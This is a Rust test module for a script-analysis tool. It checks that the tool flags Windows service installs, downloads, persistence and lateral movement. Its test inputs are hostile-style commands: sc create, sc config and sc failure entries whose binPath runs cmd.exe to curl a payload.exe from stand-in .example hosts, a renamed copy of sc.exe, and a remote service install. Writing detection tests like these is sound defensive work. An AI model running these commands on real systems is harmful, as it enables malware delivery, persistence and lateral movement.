#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod service_install_tests {
    use crate::{analyze, Config, Trait};

    #[test]
    fn sc_create_binpath_cmd_child_is_analyzed() {
        let script = br#"sc create UpdateSvc binPath= "cmd.exe /V:ON /c set U=https://sc-binpath.example/payload.exe&&curl -o payload.exe !U!""#;
        let report = analyze(script, &Config::default());

        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                Trait::ServiceInstall { service_name, bin_path }
                    if service_name == "UpdateSvc"
                        && bin_path.contains("cmd.exe /V:ON /c set U=")
            )),
            "service install trait missing: {:?}",
            report.traits
        );
        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                Trait::Download { src, dst, .. }
                    if src == "https://sc-binpath.example/payload.exe"
                        && dst.as_deref() == Some("payload.exe")
            )),
            "service binPath child command was not analyzed: {:?}",
            report.traits
        );
    }

    #[test]
    fn escaped_ampersand_sc_create_text_does_not_emit_service_install() {
        let script =
            br#"echo keep ^& sc create BadSvc binPath= C:\Users\Public\bad.exe start= auto"#;
        let report = analyze(script, &Config::default());

        assert!(
            !report.traits.iter().any(|t| matches!(
                t,
                Trait::ServiceInstall { service_name, .. } if service_name == "BadSvc"
            )),
            "escaped ampersand echo text was misread as service install: {:?}",
            report.traits
        );
    }

    #[test]
    fn escaped_ampersand_powershell_new_service_text_does_not_emit_service_install() {
        let script =
            br#"echo keep ^& powershell New-Service -Name BadSvc -BinaryPathName C:\Users\Public\bad.exe"#;
        let report = analyze(script, &Config::default());

        assert!(
            !report.traits.iter().any(|t| matches!(
                t,
                Trait::ServiceInstall { service_name, .. } if service_name == "BadSvc"
            )),
            "escaped ampersand PowerShell New-Service text was misread as service install: {:?}",
            report.traits
        );
    }

    #[test]
    fn powershell_new_service_emits_service_install_trait() {
        let script = br#"powershell -Command "New-Service -Name UpdateSvc -BinaryPathName 'cmd.exe /c calc.exe' -StartupType Automatic"
"#;
        let report = analyze(script, &Config::default());

        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                Trait::ServiceInstall { service_name, bin_path }
                    if service_name == "UpdateSvc" && bin_path == "cmd.exe /c calc.exe"
            )),
            "PowerShell New-Service install trait missing: {:?}",
            report.traits
        );
    }

    #[test]
    fn powershell_positional_new_service_emits_service_install_trait() {
        let script = br#"powershell -Command "New-Service UpdateSvc 'cmd.exe /c calc.exe' -StartupType Automatic"
"#;
        let report = analyze(script, &Config::default());

        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                Trait::ServiceInstall { service_name, bin_path }
                    if service_name == "UpdateSvc" && bin_path == "cmd.exe /c calc.exe"
            )),
            "positional PowerShell New-Service install trait missing: {:?}",
            report.traits
        );
    }

    #[test]
    fn powershell_mixed_new_service_emits_service_install_trait() {
        let script = br#"powershell -Command "New-Service -Name UpdateSvc 'cmd.exe /c calc.exe' -StartupType Automatic"
"#;
        let report = analyze(script, &Config::default());

        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                Trait::ServiceInstall { service_name, bin_path }
                    if service_name == "UpdateSvc" && bin_path == "cmd.exe /c calc.exe"
            )),
            "mixed PowerShell New-Service install trait missing: {:?}",
            report.traits
        );
    }

    #[test]
    fn powershell_short_new_service_parameters_emit_service_install_trait() {
        let script = br#"powershell -Command "New-Service -Na UpdateSvc -Bi 'cmd.exe /c calc.exe' -Sta Automatic"
"#;
        let report = analyze(script, &Config::default());

        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                Trait::ServiceInstall { service_name, bin_path }
                    if service_name == "UpdateSvc" && bin_path == "cmd.exe /c calc.exe"
            )),
            "short PowerShell New-Service parameters missed: {:?}",
            report.traits
        );
    }

    #[test]
    fn powershell_chained_new_service_emits_each_service_install_trait() {
        let script = br#"powershell -Command "New-Service -Name FirstSvc -BinaryPathName 'cmd.exe /c one.exe'; New-Service -Name UpdateSvc -BinaryPathName 'cmd.exe /c calc.exe'""#;
        let report = analyze(script, &Config::default());

        for (service, path) in [
            ("FirstSvc", "cmd.exe /c one.exe"),
            ("UpdateSvc", "cmd.exe /c calc.exe"),
        ] {
            assert!(
                report.traits.iter().any(|t| matches!(
                    t,
                    Trait::ServiceInstall { service_name, bin_path }
                        if service_name == service && bin_path == path
                )),
                "chained PowerShell New-Service install missing {service}: {:?}",
                report.traits
            );
        }
    }

    #[test]
    fn copied_sc_alias_create_binpath_cmd_child_is_analyzed() {
        let script = br#"copy C:\Windows\System32\sc.exe C:\Users\Public\svc.tmp
C:\Users\Public\svc.tmp create UpdateSvc binPath= "cmd.exe /c curl -o payload.exe https://copied-sc-binpath.example/payload.exe""#;
        let report = analyze(script, &Config::default());

        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                Trait::ManipulatedExec { target, .. }
                    if target == r#"C:\Users\Public\svc.tmp"#
            )),
            "copied sc alias did not emit manipulated execution: {:?}",
            report.traits
        );
        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                Trait::ServiceInstall { service_name, bin_path }
                    if service_name == "UpdateSvc"
                        && bin_path.contains("copied-sc-binpath.example")
            )),
            "copied sc service install trait missing: {:?}",
            report.traits
        );
        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                Trait::Download { src, dst, .. }
                    if src == "https://copied-sc-binpath.example/payload.exe"
                        && dst.as_deref() == Some("payload.exe")
            )),
            "copied sc binPath child command was not analyzed: {:?}",
            report.traits
        );
    }

    #[test]
    fn sc_config_binpath_cmd_child_is_analyzed() {
        let script = br#"sc config UpdateSvc binPath= "cmd.exe /V:ON /c set U=https://sc-config-binpath.example/payload.exe&&curl -o payload.exe !U!""#;
        let report = analyze(script, &Config::default());

        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                Trait::ServiceInstall { service_name, bin_path }
                    if service_name == "UpdateSvc"
                        && bin_path.contains("cmd.exe /V:ON /c set U=")
            )),
            "service config trait missing: {:?}",
            report.traits
        );
        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                Trait::Download { src, dst, .. }
                    if src == "https://sc-config-binpath.example/payload.exe"
                        && dst.as_deref() == Some("payload.exe")
            )),
            "service config binPath child command was not analyzed: {:?}",
            report.traits
        );
    }

    #[test]
    fn remote_sc_create_binpath_cmd_child_is_analyzed() {
        let script = br#"sc \\target.example create UpdateSvc binPath= "cmd.exe /V:ON /c set U=https://remote-sc-binpath.example/payload.exe&&curl -o payload.exe !U!""#;
        let report = analyze(script, &Config::default());

        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                Trait::LateralMovement { tool, target_host }
                    if tool == "sc" && target_host == "target.example"
            )),
            "remote sc lateral movement missing: {:?}",
            report.traits
        );
        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                Trait::ServiceInstall { service_name, bin_path }
                    if service_name == "UpdateSvc"
                        && bin_path.contains("cmd.exe /V:ON /c set U=")
            )),
            "remote service install trait missing: {:?}",
            report.traits
        );
        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                Trait::Download { src, dst, .. }
                    if src == "https://remote-sc-binpath.example/payload.exe"
                        && dst.as_deref() == Some("payload.exe")
            )),
            "remote service binPath child command was not analyzed: {:?}",
            report.traits
        );
    }

    #[test]
    fn sc_failure_command_child_is_analyzed() {
        let script = br#"sc failure UpdateSvc command= "cmd.exe /V:ON /c set U=https://sc-failure.example/payload.exe&&curl -o payload.exe !U!""#;
        let report = analyze(script, &Config::default());

        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                Trait::Persistence { hive, key, value_name, command }
                    if hive == "ServiceFailureCommand"
                        && key == "UpdateSvc"
                        && value_name == "command"
                        && command.contains("cmd.exe /V:ON /c set U=")
            )),
            "service failure command persistence missing: {:?}",
            report.traits
        );
        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                Trait::Download { src, dst, .. }
                    if src == "https://sc-failure.example/payload.exe"
                        && dst.as_deref() == Some("payload.exe")
            )),
            "service failure command child was not analyzed: {:?}",
            report.traits
        );
    }
}

